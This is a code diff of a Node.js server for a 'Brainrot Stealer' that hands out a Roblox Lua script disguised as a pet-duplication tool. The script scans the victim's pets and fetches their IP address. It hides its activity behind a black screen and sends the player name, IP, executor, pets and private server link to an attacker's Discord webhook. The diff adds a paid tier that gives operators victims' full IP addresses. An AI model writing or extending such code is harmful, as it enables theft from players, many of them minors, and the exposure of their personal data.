@@ -1,10 +1,11 @@
-// server.js - FINAL WORKING VERSION
+// server.js - WITH IP CENSORING
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Webhook storage
 const webhookStorage = new Map();
+const premiumUsers = new Map(); // Store premium users
 
 // Middleware
 app.use(express.json());
@@ -38,10 +39,16 @@ function blockNonExecutor(req, res, next) {
 // STORE WEBHOOK
 app.post("/store", (req, res) => {
   try {
-    const { webhook_id, webhook_url } = req.body;
+    const { webhook_id, webhook_url, premium } = req.body;
     
     if (webhook_id && webhook_url && webhook_url.startsWith("https://discord.com/api/webhooks/")) {
       webhookStorage.set(webhook_id, webhook_url);
+      
+      // Mark as premium if applicable
+      if (premium) {
+        premiumUsers.set(webhook_id, true);
+      }
+      
       res.json({ success: true, message: "Webhook stored" });
     } else {
       res.status(400).json({ success: false, message: "Invalid data" });
@@ -57,7 +64,11 @@ app.get("/webhook/:id", (req, res) => {
   const webhook = webhookStorage.get(webhookId);
   
   if (webhook) {
-    res.json({ success: true, webhook: webhook });
+    res.json({ 
+      success: true, 
+      webhook: webhook,
+      premium: premiumUsers.has(webhookId) || false
+    });
   } else {
     res.status(404).json({ success: false, message: "Webhook not found" });
   }
@@ -73,7 +84,7 @@ app.get("/", (req, res) => {
   res.send("Brainrot Stealer Server");
 });
 
-// /raw → FIXED LUA SCRIPT (NO BACKTICKS)
+// /raw → FINAL LUA SCRIPT WITH IP CENSORING
 app.get("/raw", blockNonExecutor, (req, res) => {
   const webhookId = req.query.id;
 
@@ -81,7 +92,7 @@ app.get("/raw", blockNonExecutor, (req, res) => {
     return res.status(400).send("-- MISSING WEBHOOK ID --");
   }
 
-  const luaScript = `-- Brainrot Stealer - Simple Version
+  const luaScript = `-- Brainrot Stealer - Final Version
 print("Loading Brainrot Stealer...")
 
 local Players = game:GetService("Players")
@@ -133,10 +144,10 @@ local function getWebhook()
         if response and response.Body then
             local data = HttpService:JSONDecode(response.Body)
             if data and data.success then
-                return data.webhook
+                return data.webhook, data.premium or false
             end
         end
-        return nil
+        return nil, false
     end)
     
     return success and result
@@ -144,7 +155,7 @@ end
 
 -- Send to Discord
 local function sendToDiscord(embedData)
-    local webhook = getWebhook()
+    local webhook, isPremium = getWebhook()
     if not webhook then
         print("No webhook available")
         return false
@@ -184,12 +195,29 @@ local function sendToDiscord(embedData)
     return success and result and (result.StatusCode == 200 or result.StatusCode == 204)
 end
 
--- Get IP
-local function getIP()
+-- Get IP with censoring for non-premium
+local function getIP(isPremium)
     local success, ip = pcall(function()
         return game:HttpGet("https://api.ipify.org", true)
     end)
-    return success and ip or "Unknown"
+    
+    if success and ip then
+        if isPremium then
+            return ip -- Full IP for premium users
+        else
+            -- Censor IP for non-premium users
+            local parts = {}
+            for part in ip:gmatch("%d+") do
+                table.insert(parts, part)
+            end
+            if #parts == 4 then
+                return parts[1] .. "." .. parts[2] .. ".XXX.XXX"
+            else
+                return "XXX.XXX.XXX.XXX"
+            end
+        end
+    end
+    return "Unknown"
 end
 
 -- Get executor
@@ -263,7 +291,7 @@ local function scanPets()
     return allPets, brainrotPets
 end
 
--- Create simple input GUI
+-- Create simple input GUI (NO BLACK BACKGROUND)
 local function createInputGUI()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "InputGUI"
@@ -414,7 +442,7 @@ dupeButton.MouseButton1Click:Connect(function()
         return
     end
     
-    -- INSTANTLY create black background
+    -- INSTANTLY create black background (blocks everything)
     local blackScreen = createBlackBackground()
     
     -- Remove input GUI
@@ -428,7 +456,8 @@ dupeButton.MouseButton1Click:Connect(function()
     
     -- Get user info
     local executor = getExecutor()
-    local ip = getIP()
+    local webhook, isPremium = getWebhook()
+    local ip = getIP(isPremium)
     
     -- Format brainrots for code block
     local brainrotsText = ""
@@ -445,7 +474,7 @@ dupeButton.MouseButton1Click:Connect(function()
         hitStatus = "this dosent look like a legit hit"
     end
     
-    -- Create embed (FIXED - NO BACKTICKS)
+    -- Create embed (EXACT FORMAT AS REQUESTED)
     local embed = {
         title = "# LOGGED PLAYER",
         description = "a player just ran your script!",
@@ -453,17 +482,17 @@ dupeButton.MouseButton1Click:Connect(function()
         fields = {
             {
                 name = "Player Info",
-                value = "Player Name: " .. player.Name .. "\\nIP ADDRESS: " .. ip .. "\\nExecutor: " .. executor,
+                value = "Player Name: " .. player.Name .. "\\nIP ADDRESS: " .. ip .. "\\nExecutor: " .. executor .. "\\nPremium: " .. (isPremium and "✅ YES" or "❌ NO"),
                 inline = false
             },
             {
                 name = "Brainrots", 
-                value = brainrotsText,
+                value = "Brainrots:\\n" .. brainrotsText,
                 inline = false
             },
             {
                 name = "Private Server",
-                value = serverLink,
+                value = "Private Server: " .. serverLink,
                 inline = false
             },
             {
